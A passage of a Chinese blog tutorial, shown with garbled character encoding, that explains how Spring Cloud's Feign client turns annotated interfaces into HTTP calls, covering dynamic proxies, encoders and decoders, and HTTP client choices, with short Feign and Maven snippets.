<p>åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25BE%25AE%25E6%259C%258D%25E5%258A%25A1%25E6%259E%25B6%25E6%259E%2584%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84&amp;zhida_source=entity" ref="nofollow noopener noreferrer">å¾®æœåŠ¡æ¶æ„</a>ç››è¡Œçš„å½“ä¸‹ï¼ŒæœåŠ¡é—´çš„è¿œç¨‹è°ƒç”¨æˆä¸ºäº†æ¶æ„è®¾è®¡ä¸­æ— æ³•å›é¿çš„å…³é”®ç¯èŠ‚ã€‚å°±å¥½æ¯”ä¸€ä¸ªå¤§å‹å·¥å‚ï¼Œå„ä¸ªè½¦é—´ï¼ˆå¾®æœåŠ¡ï¼‰è´Ÿè´£ä¸åŒçš„ç”Ÿäº§ç¯èŠ‚ï¼Œä½†å®ƒä»¬ä¹‹é—´éœ€è¦é¢‘ç¹ä¼ é€’åŸææ–™ã€åŠæˆå“å’Œç”Ÿäº§æŒ‡ä»¤ï¼Œè¿™å°±ä¾èµ–äºé«˜æ•ˆçš„è¿œç¨‹è°ƒç”¨æœºåˆ¶ã€‚åœ¨ Spring é¡¹ç›®ä¸­ï¼Œæ—©æœŸå¸¸ç”¨çš„è¿œç¨‹è°ƒç”¨å·¥å…· RestTemplateï¼Œè™½ç„¶èƒ½å®ŒæˆåŸºæœ¬çš„ HTTP è¯·æ±‚æ“ä½œï¼Œå´å­˜åœ¨è¯¸å¤šå¼Šç«¯ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œæ¯æ¬¡å‘èµ·è¿œç¨‹è°ƒç”¨ï¼Œéƒ½å¾—åƒæ‰‹å·¥æ­å»ºç§¯æœ¨ä¸€æ ·æ‰‹åŠ¨æ‹¼æ¥ URLã€‚å¦‚æœæœåŠ¡åœ°å€å˜æ›´ï¼Œæˆ–è€…å‚æ•°æœ‰è°ƒæ•´ï¼Œé‚£æ‹¼æ¥çš„ä»£ç å°±å¾—è·Ÿç€ä¿®æ”¹ï¼Œç¨æœ‰ä¸æ…å°±å¯èƒ½å‡ºé”™ã€‚è€Œä¸”ï¼Œå¯¹äºå‚æ•°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä¹Ÿéœ€è¦å¼€å‘è€…æ‰‹åŠ¨å¤„ç†ï¼Œè¿™å°±åƒæ˜¯åœ¨æ¯æ¬¡è¿è¾“è´§ç‰©å‰ï¼Œéƒ½å¾—äº²è‡ªæ‰“åŒ…å’Œæ‹†åŒ…ï¼Œé‡å¤ä¸”ç¹çã€‚æ¯”å¦‚ï¼Œå½“ä½ éœ€è¦ä¼ é€’ä¸€ä¸ªå¤æ‚çš„ Java å¯¹è±¡ä½œä¸ºè¯·æ±‚å‚æ•°æ—¶ï¼Œä½ å¾—æ‰‹åŠ¨å°†å…¶è½¬æ¢ä¸º JSON æˆ– XML æ ¼å¼ï¼Œåœ¨æ¥æ”¶å“åº”æ—¶ï¼Œåˆå¾—æ‰‹åŠ¨å°†è¿”å›çš„ JSON æˆ– XML è§£ææˆ Java å¯¹è±¡ã€‚</p>
<p>éšç€å¾®æœåŠ¡æ•°é‡çš„å¢åŠ ï¼Œä»£ç ä¸­å……æ–¥ç€å¤§é‡ç±»ä¼¼çš„è¿œç¨‹è°ƒç”¨ä»£ç ï¼Œä¸ä»…å†—ä½™åº¦é«˜ï¼Œå¯è¯»æ€§ä¹Ÿæå·®ã€‚è¿™å°±å¥½æ¯”å·¥å‚é‡Œçš„å„ä¸ªè½¦é—´ä¹‹é—´çš„æ²Ÿé€šæ–¹å¼æ‚ä¹±æ— ç« ï¼Œå¯¼è‡´ç»´æŠ¤æˆæœ¬æ€¥å‰§ä¸Šå‡ã€‚å½“ä¸€ä¸ªå¾®æœåŠ¡éœ€è¦è°ƒç”¨å¤šä¸ªå…¶ä»–å¾®æœåŠ¡æ—¶ï¼Œæˆ–è€…å¤šä¸ªå¾®æœåŠ¡ä¹‹é—´å­˜åœ¨å¤æ‚çš„ç›¸äº’è°ƒç”¨å…³ç³»æ—¶ï¼Œä»£ç çš„ç»´æŠ¤éš¾åº¦å°±ä¼šå‘ˆæŒ‡æ•°çº§å¢é•¿ï¼Œç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ï¼Œä¿®æ”¹ä¸€å¤„è°ƒç”¨å¯èƒ½ä¼šå½±å“åˆ°æ•´ä¸ªç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚</p>
<h3 data-id="heading-2"><strong>1.2 Feignï¼šå£°æ˜å¼è¿œç¨‹è°ƒç”¨çš„ â€œåˆ©å™¨â€</strong></h3>
<p>Feignï¼Œä½œä¸ºÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BCloud%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=Spring+Cloud&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring Cloud</a>Â ç”Ÿæ€ä¸­ä¸€æ¬¾å¼ºå¤§çš„å£°æ˜å¼ HTTP å®¢æˆ·ç«¯ï¼Œå°±åƒæ˜¯ç»™å¾®æœåŠ¡é—´çš„è¿œç¨‹è°ƒç”¨è£…ä¸Šäº†æ™ºèƒ½å¯¼èˆªç³»ç»Ÿï¼Œå®Œç¾åœ°è§£å†³äº†ä¸Šè¿°å›°å¢ƒã€‚å®ƒçš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºï¼Œé€šè¿‡ â€œæ¥å£ + æ³¨è§£â€ çš„æ–¹å¼ï¼Œè®©è¿œç¨‹è°ƒç”¨å˜å¾—åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·ç›´è§‚å’Œç®€å•ã€‚</p>
<p>ä»¥ä¸€ä¸ªç”µå•†ç³»ç»Ÿä¸ºä¾‹ï¼Œè®¢å•æœåŠ¡éœ€è¦è°ƒç”¨ç”¨æˆ·æœåŠ¡è·å–ç”¨æˆ·ä¿¡æ¯ã€‚ä½¿ç”¨ Feignï¼Œæˆ‘ä»¬åªéœ€å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œåœ¨æ¥å£æ–¹æ³•ä¸Šæ·»åŠ ç›¸åº”çš„æ³¨è§£ï¼Œå¦‚@FeignClientæŒ‡å®šè¦è°ƒç”¨çš„æœåŠ¡åï¼Œ@RequestMappingç­‰æ³¨è§£å®šä¹‰è¯·æ±‚è·¯å¾„å’Œå‚æ•°ï¼Œå°±å¯ä»¥è½»æ¾å®ç°è¿œç¨‹è°ƒç”¨ã€‚å¯¹æ¯” RestTemplateï¼ŒFeign æ— éœ€æ‰‹åŠ¨æ‹¼æ¥ URL å’Œå¤„ç†å‚æ•°åºåˆ—åŒ– / ååºåˆ—åŒ–ï¼Œä»£ç é‡å¤§å¹…å‡å°‘ï¼Œå¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§æ˜¾è‘—æå‡ã€‚è¿™å°±å¥½æ¯”è½¦é—´ä¹‹é—´çš„æ²Ÿé€šä¸å†éœ€è¦ç¹ççš„äººå·¥ä¼ é€’ä¿¡æ¯ï¼Œè€Œæ˜¯é€šè¿‡ä¸€å¥—æ ‡å‡†åŒ–çš„æ™ºèƒ½é€šä¿¡ç³»ç»Ÿï¼Œç›´æ¥å‘é€å’Œæ¥æ”¶æ¸…æ™°æ˜ç¡®çš„æŒ‡ä»¤ã€‚</p>
<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢ç©¶ Feign çš„åº•å±‚åŸç†ï¼Œæ­å¼€å®ƒæ˜¯å¦‚ä½•å®ç°å¦‚æ­¤ç®€æ´é«˜æ•ˆçš„è¿œç¨‹è°ƒç”¨ï¼›é€šè¿‡å®æˆ˜æ“ä½œï¼Œè®©å¤§å®¶äº²èº«ä½“éªŒ Feign åœ¨é¡¹ç›®ä¸­çš„åº”ç”¨ï¼›è¿˜ä¼šæ¢è®¨ Feign çš„é«˜çº§ç‰¹æ€§ï¼Œå¦‚è´Ÿè½½å‡è¡¡ã€ç†”æ–­é™çº§ç­‰ï¼Œå¸®åŠ©å¤§å®¶å…¨é¢æŒæ¡è¿™ä¸€å¼ºå¤§å·¥å…·ï¼Œåœ¨ Spring é¡¹ç›®å¼€å‘ä¸­å¦‚è™æ·»ç¿¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86e119a06ccc461db63391639f5e5067~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=hPs2%2F6iP%2FCbOPy8vEPpust2ByAo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>äºŒã€æ ¸å¿ƒåŸç†æ­ç§˜ï¼šFeign å¦‚ä½• â€œåŒ–æ¥å£ä¸º HTTP è¯·æ±‚â€ï¼Ÿ</strong></h2>
<h3 data-id="heading-4"><strong>2.1 çµé­‚æœºåˆ¶ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%258A%25A8%25E6%2580%2581%25E4%25BB%25A3%25E7%2590%2586%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86&amp;zhida_source=entity" ref="nofollow noopener noreferrer">åŠ¨æ€ä»£ç†</a>æ˜¯ Feign çš„ â€œæ ¸å¿ƒå¼•æ“â€</strong></h3>
<p>Feign çš„æ ¸å¿ƒå®ç°ä¾èµ–äº JDK åŠ¨æ€ä»£ç†ï¼Œè¿™ä¸€æœºåˆ¶å°±åƒæ˜¯éšè—åœ¨å¹•åçš„ â€œè¶…çº§å¤§è„‘â€ï¼ŒæŒæ§ç€ Feign ä»æ¥å£å®šä¹‰åˆ° HTTP è¯·æ±‚çš„ç¥å¥‡è½¬åŒ–è¿‡ç¨‹ã€‚</p>
<p>å½“æˆ‘ä»¬åœ¨ Spring é¡¹ç›®ä¸­å¯åŠ¨åº”ç”¨æ—¶ï¼Œ@EnableFeignClientsæ³¨è§£å°±å¦‚åŒå¹å“äº†é›†åˆçš„å·è§’ï¼Œè§¦å‘ Spring å¯¹æŒ‡å®šåŒ…è·¯å¾„ä¸‹æ‰€æœ‰æ ‡æ³¨äº†@FeignClientæ³¨è§£çš„æ¥å£è¿›è¡Œæ‰«æã€‚åœ¨æ‰«æè¿‡ç¨‹ä¸­ï¼ŒSpring ä¼šä¸ºæ¯ä¸€ä¸ªè¿™æ ·çš„æ¥å£ç²¾å¿ƒç”Ÿæˆä¸€ä¸ªä»£ç†ç±»ï¼Œè¿™ä¸ªä»£ç†ç±»å¯ä¸æ˜¯æ™®é€šçš„ç±»ï¼Œå®ƒæ˜¯ç”±FeignInvocationHandleré©±åŠ¨çš„ç‰¹æ®Šå­˜åœ¨ã€‚</p>
<p>ä»¥ä¸€ä¸ªç®€å•çš„ç”µå•†è®¢å•æœåŠ¡è°ƒç”¨ç”¨æˆ·æœåŠ¡è·å–ç”¨æˆ·åœ°å€çš„åœºæ™¯ä¸ºä¾‹ã€‚æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªUserServiceFeignClientæ¥å£ï¼Œå¹¶ä½¿ç”¨@FeignClient(name = "user-service")æ³¨è§£æ ‡è®°å®ƒï¼ŒæŒ‡å®šè¦è°ƒç”¨çš„æ˜¯åä¸ºuser-serviceçš„å¾®æœåŠ¡ã€‚å½“é¡¹ç›®å¯åŠ¨åï¼ŒSpring ä¼šæ‰«æåˆ°è¿™ä¸ªæ¥å£ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„ä»£ç†ç±»ã€‚</p>
<p>å½“è®¢å•æœåŠ¡ä¸­çš„ä»£ç è°ƒç”¨UserServiceFeignClientæ¥å£çš„æŸä¸ªæ–¹æ³•ï¼Œæ¯”å¦‚getUserAddress(Long userId)æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ä»£ç†ç±»ä¸­çš„æ–¹æ³•ã€‚ä»£ç†ç±»ä¸­çš„FeignInvocationHandlerä¼šè¿…é€Ÿæ¥ç®¡è¿™ä¸ªè¯·æ±‚ï¼Œå°±åƒæ¥åˆ°ä»»åŠ¡çš„ç‰¹ç§å…µä¸€æ ·é«˜æ•ˆè¡ŒåŠ¨ã€‚å®ƒä¼šæ ¹æ®æ¥å£æ–¹æ³•ä¸Šçš„æ³¨è§£ï¼ˆå¦‚@GetMappingã€@PathVariableç­‰ï¼‰ä»¥åŠæ–¹æ³•å‚æ•°ï¼Œç²¾å¿ƒæ„å»ºå‡ºä¸€ä¸ªåŒ…å«å®Œæ•´ HTTP è¯·æ±‚ä¿¡æ¯çš„RequestTemplateï¼Œè¿™ä¸ªæ¨¡æ¿å°±åƒæ˜¯ä¸€ä»½è¯¦ç»†çš„ä½œæˆ˜è®¡åˆ’ï¼ŒåŒ…å«äº†è¯·æ±‚çš„ URLã€æ–¹æ³•ï¼ˆGETã€POST ç­‰ï¼‰ã€è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ç­‰å…³é”®ä¿¡æ¯ã€‚</p>
<p>æ¥ç€ï¼ŒFeignInvocationHandlerä¼šæ ¹æ®è¿™ä¸ªRequestTemplateç”ŸæˆçœŸæ­£çš„ HTTP è¯·æ±‚ï¼Œå¹¶é€šè¿‡ Feign çš„Clientç»„ä»¶ï¼ˆåé¢ä¼šè¯¦ç»†ä»‹ç»ï¼‰å°†è¯·æ±‚å‘é€åˆ°ç›®æ ‡æœåŠ¡ï¼ˆuser-serviceï¼‰ã€‚è¿™ä¸€ç³»åˆ—æ“ä½œéƒ½åœ¨åŠ¨æ€ä»£ç†çš„æœºåˆ¶ä¸‹è‡ªåŠ¨å®Œæˆï¼Œå¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ï¼Œå¼€å‘è€…åªéœ€è¦å…³æ³¨æ¥å£çš„å®šä¹‰å’Œä¸šåŠ¡é€»è¾‘ï¼Œæ— éœ€æ“å¿ƒåº•å±‚çš„ HTTP è¯·æ±‚ç»†èŠ‚ï¼Œå¤§å¤§æé«˜äº†å¼€å‘æ•ˆç‡å’Œä»£ç çš„å¯è¯»æ€§ã€‚</p>
<h3 data-id="heading-5"><strong>2.2 äº”å¤§æ ¸å¿ƒç»„ä»¶ï¼šFeign çš„ â€œäº”è„å…­è…‘â€</strong></h3>
<p>Feign ä¹‹æ‰€ä»¥èƒ½å®ç°å¦‚æ­¤å¼ºå¤§è€Œç®€æ´çš„è¿œç¨‹è°ƒç”¨åŠŸèƒ½ï¼Œç¦»ä¸å¼€å®ƒå†…éƒ¨çš„äº”å¤§æ ¸å¿ƒç»„ä»¶ï¼Œå®ƒä»¬å„å¸å…¶èŒï¼Œç´§å¯†åä½œï¼Œå°±åƒäººä½“çš„äº”è„å…­è…‘ä¸€æ ·ï¼Œå…±åŒç»´æŒç€ Feign çš„æ­£å¸¸è¿è½¬ã€‚</p>
<h3 data-id="heading-6"><strong>2.2.1 Encoder &amp;Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3DDecoder%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=Decoder&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Decoder</a>ï¼šå‚æ•°ä¸å“åº”çš„ â€œç¿»è¯‘å®˜â€</strong></h3>
<p>åœ¨ Feign çš„è¿œç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­ï¼ŒEncoderå’ŒDecoderå°±åƒæ˜¯ä¸€å¯¹é»˜å¥‘çš„ â€œç¿»è¯‘å®˜â€ï¼Œè´Ÿè´£è§£å†³ Java å¯¹è±¡ä¸ HTTP è¯·æ±‚ / å“åº”ä¹‹é—´çš„æ•°æ®æ ¼å¼è½¬æ¢é—®é¢˜ã€‚</p>
<p>Encoderçš„èŒè´£æ˜¯å°† Java æ–¹æ³•ä¸­çš„å‚æ•°ï¼ˆå¯èƒ½æ˜¯å„ç§å¤æ‚çš„ Java å¯¹è±¡ï¼‰ç¼–ç æˆ HTTP è¯·æ±‚ä½“èƒ½å¤Ÿæ¥å—çš„æ ¼å¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒFeign ä½¿ç”¨SpringEncoderï¼Œå¹¶ç»“åˆ Jackson åº“æ¥å®ç° JSON æ ¼å¼çš„åºåˆ—åŒ–ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ª Feign æ¥å£æ–¹æ³•ï¼Œä¼ é€’ä¸€ä¸ªåŒ…å«ç”¨æˆ·ä¿¡æ¯çš„Userå¯¹è±¡ä½œä¸ºå‚æ•°æ—¶ï¼ŒEncoderä¼šå°†è¿™ä¸ªUserå¯¹è±¡è½¬æ¢æˆ JSON å­—ç¬¦ä¸²ï¼Œç„¶åæ”¾å…¥ HTTP è¯·æ±‚ä½“ä¸­å‘é€ç»™æœåŠ¡ç«¯ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@FeignClient</span>(name = <span class="hljs-string">"user-service"</span>)
public interface UserFeignClient {
    <span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/user/save"</span>)
    void <span class="hljs-built_in">saveUser</span>(<span class="hljs-variable">@RequestBody</span> User user);
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå½“è°ƒç”¨saveUseræ–¹æ³•æ—¶ï¼ŒEncoderä¼šè‡ªåŠ¨å°†Userå¯¹è±¡åºåˆ—åŒ–ä¸º JSON æ ¼å¼ï¼Œå¡«å……åˆ° HTTP è¯·æ±‚çš„bodyéƒ¨åˆ†ã€‚</p>
<p>Decoderåˆ™æ­£å¥½ç›¸åï¼Œå®ƒè´Ÿè´£å°†æœåŠ¡ç«¯è¿”å›çš„ HTTP å“åº”ä½“ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚åŒæ ·é»˜è®¤ä½¿ç”¨ Jackson åº“ï¼Œå°† JSON æ ¼å¼çš„å“åº”æ•°æ®è½¬æ¢ä¸ºå¯¹åº”çš„ Java å¯¹è±¡ã€‚æ¯”å¦‚ï¼ŒæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªåŒ…å«ç”¨æˆ·åˆ—è¡¨çš„ JSON æ•°æ®ï¼ŒDecoderä¼šå°†å…¶è§£ææˆListå¯¹è±¡ï¼Œæ–¹ä¾¿è°ƒç”¨æ–¹åœ¨ Java ä»£ç ä¸­è¿›è¡Œåç»­å¤„ç†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@FeignClient(name = <span class="hljs-string">"user-service"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserFeignClient</span> {
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/list"</span>)</span>
    List&lt;User&gt; getUserList();
}
</code></pre>
<p>è°ƒç”¨getUserListæ–¹æ³•åï¼ŒDecoderä¼šå°†æœåŠ¡ç«¯è¿”å›çš„ JSON æ•°æ®ååºåˆ—åŒ–ä¸ºListå¯¹è±¡è¿”å›ç»™è°ƒç”¨è€…ã€‚é€šè¿‡Encoderå’ŒDecoderçš„é…åˆï¼ŒFeign å®ç°äº†å‚æ•°å’Œå“åº”åœ¨ Java ä¸–ç•Œä¸ HTTP ä¸–ç•Œä¹‹é—´çš„æ— ç¼è½¬æ¢ï¼Œè®©å¼€å‘è€…æ— éœ€æ‰‹åŠ¨å¤„ç†ç¹ççš„æ•°æ®æ ¼å¼è½¬æ¢å·¥ä½œã€‚</p>
<h3 data-id="heading-7"><strong>2.2.2 Clientï¼šHTTP è¯·æ±‚çš„ â€œæ‰§è¡Œè€…â€</strong></h3>
<p>Clientç»„ä»¶æ˜¯ Feign ä¸­çœŸæ­£è´Ÿè´£å‘é€ HTTP è¯·æ±‚çš„ â€œæ‰§è¡Œè€…â€ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä½å‹‡æ•¢çš„ä¿¡ä½¿ï¼Œå¸¦ç€ Feign æ„å»ºå¥½çš„ HTTP è¯·æ±‚ï¼Œç©¿è¶Šç½‘ç»œï¼Œå°†è¯·æ±‚é€è¾¾ç›®æ ‡æœåŠ¡ï¼Œå¹¶å¸¦å›å“åº”ã€‚</p>
<p>Feign é»˜è®¤ä½¿ç”¨ JDK è‡ªå¸¦çš„HttpURLConnectionä½œä¸ºåº•å±‚çš„ HTTP å®¢æˆ·ç«¯ï¼Œå®ƒæ˜¯ Java æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œæ— éœ€é¢å¤–å¼•å…¥ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œå…·æœ‰ä¸€å®šçš„é€šç”¨æ€§å’Œç¨³å®šæ€§ï¼Œé€‚åˆä¸€äº›å¯¹ä¾èµ–ç®€æ´æ€§è¦æ±‚è¾ƒé«˜çš„è½»é‡çº§åº”ç”¨åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€äº›å°å‹çš„ Spring Boot é¡¹ç›®ä¸­ï¼Œä½¿ç”¨é»˜è®¤çš„HttpURLConnectionä½œä¸ºClientï¼Œå¯ä»¥å¿«é€Ÿæ­å»ºèµ· Feign çš„è¿œç¨‹è°ƒç”¨åŠŸèƒ½ï¼Œä¸”ä¸ä¼šå¢åŠ è¿‡å¤šçš„é¡¹ç›®å¤æ‚æ€§ã€‚</p>
<p>ç„¶è€Œï¼Œåœ¨é«˜å¹¶å‘ã€å¯¹æ€§èƒ½è¦æ±‚è‹›åˆ»çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒHttpURLConnectionçš„ä¸€äº›å±€é™æ€§å°±å¯èƒ½ä¼šæš´éœ²å‡ºæ¥ï¼Œæ¯”å¦‚å®ƒä¸æ”¯æŒè¿æ¥æ± ï¼Œåœ¨å¤§é‡è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œé¢‘ç¹åˆ›å»ºå’Œé”€æ¯è¿æ¥ä¼šæ¶ˆè€—å¤§é‡çš„ç³»ç»Ÿèµ„æºï¼Œå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚ä¸ºäº†æ»¡è¶³è¿™äº›é«˜æ€§èƒ½åœºæ™¯çš„éœ€æ±‚ï¼ŒSpring Cloud å¯¹ Feign è¿›è¡Œäº†æ‰©å±•ï¼Œæ”¯æŒé›†æˆApache HttpClientå’ŒOkHttpè¿™ä¸¤æ¬¾ä¼˜ç§€çš„ HTTP å®¢æˆ·ç«¯ã€‚</p>
<p>Apache HttpClientæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ã€æˆç†Ÿç¨³å®šçš„ HTTP å®¢æˆ·ç«¯åº“ï¼Œå®ƒæä¾›äº†ä¸°å¯Œçš„é…ç½®é€‰é¡¹ï¼Œæ¯”å¦‚å¯ä»¥çµæ´»é…ç½®è¿æ¥æ± ã€çº¿ç¨‹æ± ç®¡ç†ï¼Œè¿˜èƒ½ç²¾ç»†æ§åˆ¶è¶…æ—¶ã€é‡è¯•ç­‰ç­–ç•¥ã€‚åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­ï¼Œå°¤å…¶æ˜¯å¯¹è¿æ¥ç®¡ç†å’Œèµ„æºå¤ç”¨æœ‰è¾ƒé«˜è¦æ±‚çš„åœºæ™¯ä¸‹ï¼ŒApache HttpClientèƒ½å¤Ÿå……åˆ†å‘æŒ¥å…¶ä¼˜åŠ¿ï¼Œæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œæ€§èƒ½ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªå¤§å‹ç”µå•†ç³»ç»Ÿä¸­ï¼Œè®¢å•æœåŠ¡éœ€è¦é¢‘ç¹è°ƒç”¨åº“å­˜æœåŠ¡å’Œæ”¯ä»˜æœåŠ¡ï¼Œä½¿ç”¨Apache HttpClientä½œä¸º Feign çš„Clientï¼Œé€šè¿‡åˆç†é…ç½®è¿æ¥æ± ï¼Œå¯ä»¥å¤§å¤§å‡å°‘è¿æ¥å»ºç«‹çš„å¼€é”€ï¼Œæé«˜è¯·æ±‚å¤„ç†é€Ÿåº¦ã€‚</p>
<p>OkHttpåˆ™ä»¥å…¶è½»é‡çº§ã€é«˜æ€§èƒ½è€Œå¤‡å—é’çï¼Œå®ƒæ”¯æŒ HTTP/2 åè®®ï¼Œèƒ½å¤Ÿæ˜¾è‘—æå‡æ•°æ®ä¼ è¾“æ•ˆç‡ï¼Œå¹¶ä¸”è‡ªå¸¦è¿æ¥æ± å’Œè¯·æ±‚ç¼“å­˜åŠŸèƒ½ï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–äº†æ€§èƒ½ã€‚åœ¨è¿½æ±‚æè‡´æ€§èƒ½çš„ç°ä»£å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒOkHttpæ˜¯ä¸€ä¸ªéå¸¸ä¸é”™çš„é€‰æ‹©ã€‚æ¯”å¦‚ï¼Œåœ¨ä¸€äº›å¯¹å“åº”é€Ÿåº¦è¦æ±‚æé«˜çš„ç§»åŠ¨åº”ç”¨åç«¯æœåŠ¡ä¸­ï¼Œä½¿ç”¨OkHttpä½œä¸º Feign çš„Clientï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘ç”¨æˆ·ç­‰å¾…æ—¶é—´ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</p>
<p>è¦åœ¨ Feign ä¸­åˆ‡æ¢Clientå®ç°éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨é¡¹ç›®çš„pom.xmlæ–‡ä»¶ä¸­æ·»åŠ ç›¸åº”çš„ä¾èµ–å³å¯ã€‚å¦‚æœè¦åˆ‡æ¢åˆ°Apache HttpClientï¼Œæ·»åŠ ä»¥ä¸‹ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>httpclient<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å¦‚æœè¦åˆ‡æ¢åˆ°OkHttpï¼Œæ·»åŠ ä»¥ä¸‹ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.github.openfeign<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>feign-okhttp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®é¡¹ç›®çš„å®é™…éœ€æ±‚ï¼Œçµæ´»é€‰æ‹©æœ€é€‚åˆçš„ HTTP å®¢æˆ·ç«¯ï¼Œè®© Feign åœ¨ä¸åŒçš„åœºæ™¯ä¸‹éƒ½èƒ½å‘æŒ¥å‡ºæœ€ä½³æ€§èƒ½ã€‚</p>
<h3 data-id="heading-8"><strong>2.2.3 Contractï¼šæ³¨è§£çš„ â€œè§£æå™¨â€</strong></h3>
<p>Contractåœ¨ Feign ä¸­æ‰®æ¼”ç€æ³¨è§£ â€œè§£æå™¨â€ çš„é‡è¦è§’è‰²ï¼Œå®ƒè´Ÿè´£å°† Feign æ¥å£ä¸Šçš„æ³¨è§£ç¿»è¯‘æˆ HTTP è¯·æ±‚æ‰€éœ€çš„å…ƒæ•°æ®ï¼Œå°±åƒæ˜¯ä¸€ä½ä¸“ä¸šçš„ç¿»è¯‘ï¼Œå°†é«˜çº§è¯­è¨€ç¿»è¯‘æˆæœºå™¨èƒ½ç†è§£çš„æŒ‡ä»¤ã€‚</p>
